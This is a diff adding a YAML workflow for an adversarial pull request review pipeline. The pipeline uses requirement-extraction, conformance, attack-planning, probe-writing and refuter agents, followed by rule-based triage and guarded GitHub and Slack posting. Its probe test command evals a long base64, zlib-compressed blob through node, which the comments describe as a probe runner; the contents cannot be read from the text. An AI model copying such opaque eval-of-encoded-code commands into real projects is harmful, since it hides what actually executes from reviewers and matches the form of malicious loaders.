@@ -1,0 +1,284 @@
+# Adversarial pull request review against a requirement. Give it a pull request and, optionally, what the change
+# was supposed to do: a GitHub issue, a Jira ticket, or text you type. With none of those the pull request's own
+# description is the (inferred, advisory) requirement.
+#   requirements   an agent turns the ticket into numbered, testable acceptance criteria
+#   conformance    reads the PR and judges each criterion: met, partial, missing, unverifiable (and scope creep)
+#   static         one pass for correctness and security bugs, so cheap static findings are not lost
+#   surface        assumes the change is broken: maps the attack surface, ranks failure scenarios over the eight
+#                  classes of the adversarial-pr-review skill, and selects 3 to 5
+#   probe          writes one small probe per scenario into a scratch folder of its own checkout. The agent has no
+#                  shell: after it submits, the worker runs the probes with a trusted runner (the workspace test
+#                  command) and each probe reports REPRODUCED or HELD. What ran, not what the agent says, decides
+#   verify         a different model tries to refute every finding and every reproduced failure
+#   triage         RULES decide the verdict (breaks, unproven, holds), the severities and the light. No model
+#   summarize      writes the plain summary and next steps; it cannot change a fact
+# The review is a run report and a PR comment (set post to false for a dry run), and a short summary goes to Slack
+# when there is something to report. Nothing merges, closes or pushes. Ticket, issue and PR text are untrusted data.
+schema_version: "2.0"
+id: pr-review-adversarial
+name: Adversarial pull request review
+tags: [code-review, pull-request, github, jira]
+description: Checks a pull request against its requirement (text, GitHub issue or Jira ticket) and attacks it - ranked failure scenarios, executed probes, an independent refuter and a rule-decided verdict (breaks, unproven, holds).
+trigger:
+  manual: true
+inputs:
+  type: object
+  properties:
+    repo: {type: string, title: Repository, pattern: "^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$", description: "owner/name, for example acme/payments"}
+    pr: {type: integer, minimum: 1, title: Pull request number}
+    issue: {type: string, maxLength: 300, pattern: "^(([A-Z][A-Z0-9_]*-[0-9]+)|([0-9]+)|([A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+#[0-9]+)|(https://[^ ]+/issues/[0-9]+))?$", title: Issue or ticket, description: "The requirement as a GitHub issue (123, owner/name#123 or its URL) or a Jira key (PAY-142). Leave empty to type the requirement instead."}
+    requirement: {type: string, maxLength: 20000, title: Goal or requirement, description: "What the change should do, as text. Used when no issue is given. With neither, the pull request description stands in for it (marked inferred)."}
+    post: {type: boolean, default: true, title: Post the review and notify Slack (on by default; turn off for a dry run)}
+    allow_closed: {type: boolean, default: false, title: Review a closed or merged pull request too (off by default; such a run is skipped)}
+    diff_base: {type: string, pattern: "^([0-9a-f]{40}([0-9a-f]{24})?)?$", title: Review from this commit, description: "A full commit SHA the pull request's branch was built on. The review then covers only the commits after it, which is what a stacked pull request needs. Leave empty to review the whole pull request."}
+  required: [repo, pr]
+config:
+  # Filled in by the example install (setting slack_channel); empty means no Slack message.
+  channel: "{{slack_channel}}"
+  # A finding or a reproduced failure reaches the review only when the refuter confirmed it with at least this confidence (0 to 100).
+  min_confidence: 80
+  # How many attack scenarios the planner may select (the skill's cap is 5: more cannot be probed in the time).
+  max_scenarios: 5
+nodes:
+  - id: pr
+    type: tool
+    description: Read the pull request and its changed files from GitHub.
+    tool: github.get-pull-request@1
+    arguments: {repo: {ref: inputs.repo}, number: {ref: inputs.pr}}
+
+  - id: should_review
+    type: condition
+    description: Review only open pull requests (unless allow_closed is set); a closed or merged one skips every later step, so nothing is spent, posted or sent.
+    expression: "nodes.pr.output.state == 'open' || (has(inputs.allow_closed) && inputs.allow_closed) ? 'review' : 'skip'"
+    routes: {review: [source, static], skip: []}
+    default: skip
+
+  # --- the requirement ---------------------------------------------------------------------------------------
+  - id: source
+    type: condition
+    description: Where the requirement comes from - a Jira ticket, a GitHub issue, typed text, or (none given) the pull request description.
+    expression: "has(inputs.issue) && inputs.issue != '' ? (inputs.issue.matches('^[A-Z][A-Z0-9_]*-[0-9]+$') ? 'jira' : 'github') : (has(inputs.requirement) && inputs.requirement.trim() != '' ? 'text' : 'inferred')"
+    routes: {jira: [jira_issue], github: [github_issue], text: [text_pass], inferred: [inferred_pass]}
+
+  - id: jira_issue
+    type: tool
+    description: Read the Jira ticket through the Jira MCP server.
+    tool: jira.get-issue@1
+    arguments: {issue_key: {ref: inputs.issue}}
+
+  - id: intake_jira
+    type: tool
+    description: Turn the Jira ticket into one plain ticket (key, title, description, labels).
+    tool: ticket.normalize@1
+    arguments: {source: "jira", issue: {ref: nodes.jira_issue.output}}
+    project: [source, key, title, description, priority, reporter, status, labels, url]
+
+  - id: github_issue
+    type: tool
+    description: Read the GitHub issue and its first comments.
+    tool: github.get-issue@1
+    arguments: {issue: {cel: "inputs.issue.matches('^[0-9]+$') ? inputs.repo + '#' + inputs.issue : inputs.issue"}}
+
+  - id: intake_github
+    type: tool
+    description: Turn the GitHub issue into one plain ticket.
+    tool: ticket.normalize@1
+    arguments: {source: "github", issue: {ref: nodes.github_issue.output}}
+    project: [source, key, title, description, priority, reporter, status, labels, url]
+
+  - id: text_pass
+    type: condition
+    description: The requirement is the typed text. Marks that branch for the join below.
+    expression: "'go'"
+    routes: {go: []}
+    default: go
+
+  - id: inferred_pass
+    type: condition
+    description: No requirement was given - the pull request description stands in for it. Marks that branch for the join below.
+    expression: "'go'"
+    routes: {go: []}
+    default: go
+
+  # The join reads nothing from before the branches: a merge node runs when any input got through.
+  - id: ticket
+    type: script
+    description: The requirement as one plain ticket - an issue, the typed text, or the pull request's own title and description (marked inferred).
+    runtime: python
+    entrypoint: scripts/ticket.py
+    merge: any
+    depends_on: [text_pass, inferred_pass]
+    input: {map: "{'normalized': has(nodes.intake_github) ? nodes.intake_github.output : (has(nodes.intake_jira) ? nodes.intake_jira.output : null), 'comments': has(nodes.github_issue) ? nodes.github_issue.output.comments : [], 'text': has(inputs.requirement) ? inputs.requirement : '', 'pr': {'title': nodes.pr.output.title, 'body': nodes.pr.output.body, 'url': nodes.pr.output.url}}"}
+    output_schema: schemas/ticket.json
+    limits: {time: 1m, memory_mb: 256}
+
+  - id: requirements
+    type: agent
+    description: Turn the ticket into numbered, testable acceptance criteria and list what is ambiguous (requirement-extraction skill).
+    executor: opencode
+    profile: requirements-analyst@1
+    input: {map: "{'ticket': nodes.ticket.output}"}
+    output_schema: schemas/requirements.json
+    timeout: 10m
+    budget: {max_tool_calls: 2}
+
+  # --- the reviewers, each in its own fresh checkout of the pull request ---------------------------------------
+  - id: conformance
+    type: agent
+    description: Judge the pull request against each acceptance criterion - met, partial, missing, unverifiable - and note unrequested changes.
+    executor: opencode
+    profile: conformance-reviewer@1
+    workspace: &checkout
+      repo: {ref: inputs.repo}
+      ref: {cel: "'refs/pull/' + string(inputs.pr) + '/head'"}
+      # The base commit GitHub recorded for the PR, not the live base branch: once a PR is merged the
+      # branch already contains its commits and the diff against it is empty. A stacked pull request is
+      # cut from another branch, so diff_base, when given, is the commit this pull request's own work starts from.
+      base_ref: {cel: "has(inputs.diff_base) && inputs.diff_base != '' ? inputs.diff_base : nodes.pr.output.base_sha"}
+      credential: github-read-token
+    input: {map: "{'pr': nodes.pr.output, 'review_from': has(inputs.diff_base) ? inputs.diff_base : '', 'requirements': nodes.requirements.output}"}
+    output_schema: schemas/conformance.json
+    timeout: 20m
+    budget: {max_tool_calls: 20}
+
+  - id: static
+    type: agent
+    description: One static pass for correctness and security problems in the change.
+    executor: opencode
+    profile: static-reviewer@1
+    workspace: *checkout
+    input: {map: "{'pr': nodes.pr.output, 'review_from': has(inputs.diff_base) ? inputs.diff_base : ''}"}
+    output_schema: schemas/findings.json
+    timeout: 20m
+    budget: {max_tool_calls: 20}
+
+  # --- the attack -------------------------------------------------------------------------------------------------
+  - id: surface
+    type: agent
+    description: Assume the change is broken - map the attack surface, rank the failure scenarios over the eight classes and select 3 to 5 (adversarial-pr-review skill).
+    executor: opencode
+    profile: attack-planner@1
+    workspace: *checkout
+    input: {map: "{'pr': nodes.pr.output, 'review_from': has(inputs.diff_base) ? inputs.diff_base : '', 'requirements': nodes.requirements.output, 'limits': {'max_scenarios': config.max_scenarios}}"}
+    output_schema: schemas/scenarios.json
+    timeout: 20m
+    budget: {max_tool_calls: 20}
+
+  - id: should_probe
+    type: condition
+    description: Write probes only when the planner selected scenarios; otherwise there is nothing to try.
+    expression: "size(nodes.surface.output.scenarios) > 0 ? 'probe' : 'none'"
+    routes: {probe: [probe], none: []}
+    default: none
+
+  - id: probe
+    type: agent
+    description: Write one small probe per scenario under .azhi-probes/ (no shell); after it submits the worker runs them with the trusted runner and each prints REPRODUCED or HELD.
+    executor: opencode
+    profile: prober@1
+    workspace:
+      repo: {ref: inputs.repo}
+      ref: {cel: "'refs/pull/' + string(inputs.pr) + '/head'"}
+      base_ref: {cel: "has(inputs.diff_base) && inputs.diff_base != '' ? inputs.diff_base : nodes.pr.output.base_sha"}
+      credential: github-read-token
+      mode: write
+      # The probe_setup_command setting prepares the checkout, then scripts/probe-runner.cjs (compressed so the same
+      # string runs in cmd.exe and sh) runs every probe: 10 minutes each, 25 in all, always exit 0. The command comes from
+      # this workflow, never from the agent. Rebuild it with scripts/build_probe_command.mjs after editing the runner.
+      test:
+        command: "{{probe_setup_command}} && node -e \"eval(require('zlib').inflateRawSync(Buffer.from('pVZrb9s2FP3uX3EKDCWVqLSdtUOh1C3SOVuzJXWRpMCwJAtU6cpmJ5EqScX1Ev/3gZT86BvdvkjC5eV9nHMfyrSyDoXFCIbeNdIQZ0rnlBSWRfu9LBzXqZt9ouCFG5Vb2Dqdq7OFyrD8RDebyTK/ro3OyG7ZPZ1MzjECE+k/M/mgNvoNWbY6fHV4ev3qdPL88PrkDCMMB9jBT/4xHAwGK6XzyfnBcauw9+hzCicHf7RWvMqjldS61DjKMcI4dSSUnvN1UFkpa4zAbQwVYfQUZ85INeUWd3dgLBKG6jLNiPcv7W5/GoOBRcIZWfFI2FJmxAf+6soeVdJ5eyYY8zJdkij1lLODP18ctdGBYRe/nU1eChu8yWLBTRTt90pyyKXx/Fxc7fecWeC2h5WosMJQmufSeOC5xzPGLebSzX6RJZ0varIJnGkIy0gUsnRkOM9DJLmQdiwNZU6bBY8iUaX15kylFUXCauM8Mktkqctm4BQF9/0dKI2WMMzJEOZGOkcKO/3eMgSd6Ub5vAf7vUIb8BYMbxa6CPFvwNqQFLX228u7Iwz3e4A3V/mPVfZAhVELV50aS7zDweccgPC1Kd5qqTpIvNsYLAQs3lqtWBSDNa54zDzIwMcJItDGbyHzpLttXeooAVPaXZtGsRiGUqtVsm0XlbRWqim0gdIuxMiwDD58WspJ1VDw2ANkAV4JmePeaNRCc3eHewfGpAshbXjzSqRmehP5k/ZTlKSmboYnGH4qfIq9wZbU6oo4TwOnblGTLpAGZ6wtMxb9z3QVUW4hc9C7Ji3hNKSzKHSZk0GqcvgwkFqkKKV1nvqm9mp7A7Qh2C/D05ZMSYWvo3WnPwDfNC0erHo52PCABv0nIwz+S2r6hgzcjPw0qaRqHOFNk0/JfStKg9FmAnakXQyu4jUTodaHUdwFlc3zBN1AFNk851Ec5HZGZZmgSEtLrYRUpnOppklXsJ2ey6VOcMHkVGlDzFe3rDfvq1bNyYp04xKc+I6opOLbYzUO4Hae/5ZleSanKi0TsLOjX38/Oj7unFXp++dNUZBJMBzsPQwjdu/hKrybBLcQQqyyIXUTYzParo/GK+C3hOOj0wSfa9MIS2+4RbvFVje+ALYZpPfSJTDCM9lYLFfcG0HGaIP799F9ikznhJEv+cPzo5PD8eT1OfuoMoQQunFfrQuPY+4D+Xozd06/336mmzIPEyOUc1gHfhFtV9LDQYRdsGRz+EGOd3frnCuyNp1SjMeD6FvdlVoPbrfjPKK5h7tbdbYupeP9S/PsUvW7DVGGaVJ2G2+9VZ5rXVKqIlHrmketgQ2Fs7AD+3/x08NXp5Px658Px3cvDo/HUXJpd7jYiX7oW0HvKeM+oHUvz6SLvoDiTLqL4VXL7MYowzMwQ7XReZNRzpCAzajMWQz9xpK5oTxpsfP3965i/DhYY0Slpe/gTGlsHPuB7xNCKRWB+wINPK1rdBcs+oA663IyxgPlU46xtwpk2fvCT8LZ9Xjysv1VCAsy2v8X','base64'))+'')\""
+        timeout: 35m
+        attempts: 1
+    input: {map: "{'pr': nodes.pr.output, 'review_from': has(inputs.diff_base) ? inputs.diff_base : '', 'scenarios': nodes.surface.output.scenarios}"}
+    output_schema: schemas/probes.json
+    timeout: 60m
+    budget: {max_tool_calls: 30}
+
+  - id: probe_results
+    type: script
+    description: One result per scenario from what the runner printed - reproduced, ruled out or unproven; a change outside .azhi-probes/ voids the probes (plain rules, no model).
+    runtime: python
+    entrypoint: scripts/probe_results.py
+    merge: any
+    depends_on: [should_probe]
+    input: {map: "{'surface': nodes.surface.output, 'probe': has(nodes.probe) ? nodes.probe.output : {}}"}
+    output_schema: schemas/probe_results.json
+    limits: {time: 2m, memory_mb: 512}
+
+  # --- the independent check and the rules ------------------------------------------------------------------------
+  - id: verify
+    type: agent
+    description: Try to refute every finding and every reproduced failure in a fresh checkout and score the confidence (finding-verification skill, a different model).
+    executor: opencode
+    profile: finding-refuter@1
+    workspace: *checkout
+    input: {map: "{'pr': nodes.pr.output, 'review_from': has(inputs.diff_base) ? inputs.diff_base : '', 'criteria': nodes.requirements.output.criteria, 'findings': nodes.static.output.findings + nodes.conformance.output.findings + nodes.probe_results.output.findings}"}
+    output_schema: schemas/verification.json
+    timeout: 30m
+    budget: {max_tool_calls: 15}
+
+  - id: triage
+    type: script
+    description: Decide the verdict (breaks, unproven, holds), the severities, the requirement coverage and the light from the evidence (plain rules, no model).
+    runtime: python
+    entrypoint: scripts/triage.py
+    input: {map: "{'origin': nodes.ticket.output.origin, 'requirements': nodes.requirements.output, 'conformance': nodes.conformance.output, 'reviews': [nodes.static.output], 'probes': nodes.probe_results.output, 'surface': nodes.surface.output, 'checks': nodes.verify.output.checks, 'min_confidence': config.min_confidence}"}
+    output_schema: schemas/triage.json
+    limits: {time: 2m, memory_mb: 512}
+
+  - id: summarize
+    type: agent
+    description: Write the plain summary and the author's next steps from the decided facts; it cannot change them.
+    executor: opencode
+    profile: review-summarizer@1
+    input: {map: "{'pr': {'repo': nodes.pr.output.repo, 'number': nodes.pr.output.number, 'title': nodes.pr.output.title}, 'requirement': {'origin': nodes.ticket.output.origin, 'title': nodes.ticket.output.title, 'summary': nodes.requirements.output.summary}, 'facts': nodes.triage.output}"}
+    output_schema: schemas/review.json
+    timeout: 10m
+    budget: {max_tool_calls: 2}
+
+  - id: review
+    type: report
+    description: The review as a run artifact and as the PR comment (a template over the decided facts; no model writes the verdict).
+    template: templates/review.md
+    input: {map: "{'pr': nodes.pr.output, 'ticket': {'title': nodes.ticket.output.shown_title, 'url': nodes.ticket.output.url}, 'ambiguous': nodes.requirements.output.ambiguous, 'review': nodes.summarize.output, 't': nodes.triage.output, 'view': {'icon': nodes.triage.output.light == 'red' ? '🔴' : (nodes.triage.output.light == 'yellow' ? '🟡' : '🟢'), 'headline': nodes.triage.output.recommendation == 'request_changes' ? 'No-go, changes requested' : (nodes.triage.output.recommendation == 'comment' ? 'Caution' : 'Go'), 'verdict_word': nodes.triage.output.verdict == 'breaks' ? 'Breaks' : (nodes.triage.output.verdict == 'unproven' ? 'Unproven' : 'Holds'), 'origin_label': nodes.ticket.output.source == 'jira' ? 'Jira ticket' : (nodes.ticket.output.source == 'github' ? 'GitHub issue' : (nodes.ticket.output.source == 'text' ? 'typed requirement' : 'inferred from the PR description')), 'dirty': size(nodes.probe_results.output.dirty_paths) > 0, 'dirty_count': size(nodes.probe_results.output.dirty_paths)}}"}
+
+  - id: slack_message
+    type: report
+    description: "The short Slack message: verdict, summary and the findings."
+    template: templates/slack.md
+    input: {map: "{'pr': nodes.pr.output, 'review': nodes.summarize.output, 't': nodes.triage.output, 'view': {'icon': nodes.triage.output.light == 'red' ? '🔴' : (nodes.triage.output.light == 'yellow' ? '🟡' : '🟢'), 'headline': nodes.triage.output.recommendation == 'request_changes' ? 'No-go, changes requested' : (nodes.triage.output.recommendation == 'comment' ? 'Caution' : 'Go'), 'verdict_word': nodes.triage.output.verdict == 'breaks' ? 'Breaks' : (nodes.triage.output.verdict == 'unproven' ? 'Unproven' : 'Holds')}}"}
+
+  # --- output -----------------------------------------------------------------------------------------------------
+  - id: should_post
+    type: condition
+    description: Post the review unless this is a dry run (post set to false).
+    expression: "has(inputs.post) && !inputs.post ? 'skip' : 'post'"
+    depends_on: [review]
+    routes: {post: [post], skip: []}
+    default: post
+
+  - id: should_notify
+    type: condition
+    description: Tell Slack when there is something to act on (the light is not green), only when posting and a channel is set.
+    expression: "has(inputs.post) && !inputs.post ? 'skip' : (config.channel != '' && !config.channel.startsWith('{{') && nodes.triage.output.light != 'green' ? 'notify' : 'skip')"
+    depends_on: [slack_message]
+    routes: {notify: [notify], skip: []}
+    default: skip
+
+  - id: post
+    type: tool
+    description: Post the review as a comment on the pull request, or edit the review comment an earlier run posted there.
+    tool: github.comment-on-pr@1
+    arguments: {repo: {ref: inputs.repo}, number: {ref: inputs.pr}, body: {ref: nodes.review.output.markdown}}
+    # Taint gate (ADR-10): the agents read untrusted code, so the comment may only go to the
+    # pull request under review. This guard replaces the approval step: the review always posts.
+    guard: "args.repo == inputs.repo && args.number == inputs.pr"
+
+  - id: notify
+    type: notify
+    description: Slack message with the verdict and the findings.
+    channel: slack
+    destination: {ref: config.channel}
+    message: {ref: nodes.slack_message.output.markdown}
+    # Taint gate: the message may only go to the configured channel.
+    guard: "args.channel == config.channel"
